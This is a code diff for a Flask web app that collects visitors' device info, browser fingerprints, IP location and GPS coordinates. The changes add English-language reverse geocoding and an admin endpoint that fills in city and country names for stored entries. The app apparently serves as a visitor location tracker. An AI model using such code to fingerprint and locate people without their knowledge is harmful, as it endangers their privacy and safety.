@@ -334,6 +334,32 @@ def collect_data():
         device_info = json.dumps(data.get('deviceInfo', {}))
         fingerprint = data.get('fingerprint', {}).get('fp', '')
 
+        # Helper function to reverse geocode coordinates to English location names
+        def reverse_geocode_coordinates(lat, lon):
+            """Reverse geocode coordinates to get English location names"""
+            try:
+                # Use OpenStreetMap Nominatim with English language preference
+                reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
+                reverse_response = requests.get(
+                    reverse_geocode_url, 
+                    timeout=5, 
+                    headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
+                )
+                if reverse_response.ok:
+                    reverse_data = reverse_response.json()
+                    address = reverse_data.get('address', {})
+                    city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
+                    country = address.get('country')
+                    region = address.get('state') or address.get('region') or address.get('county')
+                    return {
+                        'city': city,
+                        'country': country,
+                        'region': region
+                    }
+            except Exception as e:
+                print(f"[REVERSE GEOCODE] Failed for {lat},{lon}: {e}")
+            return None
+
         # Prioritize GPS coordinates over IP location
         device_coords = data.get('deviceCoords')
         ip_info = data.get('ipInfo', {})
@@ -354,52 +380,58 @@ def collect_data():
             'raw': ip_info.get('raw', ip_info)
         }
 
+        # Get coordinates (prefer GPS, fall back to IP-based)
+        final_lat = None
+        final_lon = None
+        location_type = 'ip'
+        
         if device_coords and device_coords.get('lat') and device_coords.get('lon'):
             # User granted location permission - use GPS coordinates
-            # Try to reverse geocode GPS coordinates to get accurate city/country
-            gps_lat = device_coords.get('lat')
-            gps_lon = device_coords.get('lon')
-            
-            # Use reverse geocoding to get location from GPS coordinates
-            gps_city = None
-            gps_country = None
-            gps_region = None
-            
-            try:
-                # Try reverse geocoding using OpenStreetMap Nominatim (free, no API key needed)
-                reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={gps_lat}&lon={gps_lon}&zoom=10'
-                reverse_response = requests.get(reverse_geocode_url, timeout=5, headers={'User-Agent': 'LocationTracker/1.0'})
-                if reverse_response.ok:
-                    reverse_data = reverse_response.json()
-                    address = reverse_data.get('address', {})
-                    gps_city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
-                    gps_country = address.get('country')
-                    gps_region = address.get('state') or address.get('region')
-                    print(f"[GPS REVERSE GEOCODE] Got location: {gps_city}, {gps_region}, {gps_country}")
-            except Exception as e:
-                print(f"[GPS REVERSE GEOCODE] Failed: {e}, using IP-based location info")
-            
-            # Use GPS-based location if available, otherwise fall back to IP-based
+            final_lat = device_coords.get('lat')
+            final_lon = device_coords.get('lon')
+            location_type = 'gps'
+        elif normalized_location.get('latitude') and normalized_location.get('longitude'):
+            # Use IP-based coordinates
+            final_lat = normalized_location.get('latitude')
+            final_lon = normalized_location.get('longitude')
+            location_type = 'ip'
+
+        # Reverse geocode coordinates to get English location names
+        reverse_geocoded = None
+        if final_lat and final_lon:
+            reverse_geocoded = reverse_geocode_coordinates(final_lat, final_lon)
+            if reverse_geocoded:
+                print(f"[REVERSE GEOCODE] Got location from coordinates: {reverse_geocoded.get('city')}, {reverse_geocoded.get('region')}, {reverse_geocoded.get('country')}")
+
+        # Build location data
+        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
+            # GPS coordinates available
             location_data = json.dumps({
                 **normalized_location,  # Keep IP info for reference
                 'ip': normalized_location.get('ip') or ip_address,  # Ensure IP is always set
                 'gps': device_coords,
-                'latitude': gps_lat,
-                'longitude': gps_lon,
-                'location_type': 'gps',
+                'latitude': final_lat,
+                'longitude': final_lon,
+                'location_type': location_type,
                 'accuracy': device_coords.get('accuracy'),
                 'altitude': device_coords.get('altitude'),
-                # Use GPS-based city/country if available, otherwise use IP-based
-                'city': gps_city or normalized_location.get('city'),
-                'country': gps_country or normalized_location.get('country'),
-                'region': gps_region or normalized_location.get('region')
+                # Use reverse geocoded location (English) if available, otherwise use GPS reverse geocode, then IP-based
+                'city': (reverse_geocoded and reverse_geocoded.get('city')) or normalized_location.get('city'),
+                'country': (reverse_geocoded and reverse_geocoded.get('country')) or normalized_location.get('country'),
+                'region': (reverse_geocoded and reverse_geocoded.get('region')) or normalized_location.get('region')
             })
         else:
-            # Location permission denied - use IP-based location
+            # IP-based location (with or without coordinates)
             location_data = json.dumps({
                 **normalized_location,
                 'ip': normalized_location.get('ip') or ip_address,  # Ensure IP is always set
-                'location_type': 'ip'
+                'latitude': final_lat,
+                'longitude': final_lon,
+                'location_type': location_type,
+                # Use reverse geocoded location (English) if coordinates were available, otherwise use IP-based
+                'city': (reverse_geocoded and reverse_geocoded.get('city')) or normalized_location.get('city'),
+                'country': (reverse_geocoded and reverse_geocoded.get('country')) or normalized_location.get('country'),
+                'region': (reverse_geocoded and reverse_geocoded.get('region')) or normalized_location.get('region')
             })
 
         storage_info = json.dumps({
@@ -934,6 +966,89 @@ def reset_database():
         }), 200
     except Exception as e:
         print(f"Error resetting database: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/admin/api/update-locations', methods=['POST'])
+def update_locations_from_coordinates():
+    """Update location names for existing entries that have coordinates but no city/country"""
+    if not session.get('admin_logged_in'):
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    try:
+        # Helper function to reverse geocode coordinates to English location names
+        def reverse_geocode_coordinates(lat, lon):
+            """Reverse geocode coordinates to get English location names"""
+            try:
+                reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
+                reverse_response = requests.get(
+                    reverse_geocode_url, 
+                    timeout=5, 
+                    headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
+                )
+                if reverse_response.ok:
+                    reverse_data = reverse_response.json()
+                    address = reverse_data.get('address', {})
+                    city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
+                    country = address.get('country')
+                    region = address.get('state') or address.get('region') or address.get('county')
+                    return {
+                        'city': city,
+                        'country': country,
+                        'region': region
+                    }
+            except Exception as e:
+                print(f"[UPDATE LOCATIONS] Failed for {lat},{lon}: {e}")
+            return None
+
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute('SELECT id, location_data FROM collected_data')
+        rows = c.fetchall()
+        
+        updated_count = 0
+        for row in rows:
+            entry_id = row[0]
+            location_data_str = row[1]
+            
+            if not location_data_str:
+                continue
+                
+            try:
+                location_data = json.loads(location_data_str)
+            except:
+                continue
+            
+            # Check if we have coordinates but no city/country
+            lat = location_data.get('latitude')
+            lon = location_data.get('longitude')
+            has_city = location_data.get('city')
+            has_country = location_data.get('country')
+            
+            if lat and lon and (not has_city or not has_country):
+                # Reverse geocode to get location names
+                reverse_geocoded = reverse_geocode_coordinates(lat, lon)
+                if reverse_geocoded:
+                    # Update location data with reverse geocoded names
+                    location_data['city'] = reverse_geocoded.get('city') or location_data.get('city')
+                    location_data['country'] = reverse_geocoded.get('country') or location_data.get('country')
+                    location_data['region'] = reverse_geocoded.get('region') or location_data.get('region')
+                    
+                    # Update database
+                    c.execute('UPDATE collected_data SET location_data = ? WHERE id = ?', 
+                             (json.dumps(location_data), entry_id))
+                    updated_count += 1
+                    print(f"[UPDATE LOCATIONS] Updated entry #{entry_id}: {location_data.get('city')}, {location_data.get('country')}")
+        
+        conn.commit()
+        conn.close()
+        
+        return jsonify({
+            'status': 'success',
+            'message': f'Updated {updated_count} entries with location names from coordinates',
+            'updated_count': updated_count
+        }), 200
+    except Exception as e:
+        print(f"Error updating locations: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/debug/last-entry')
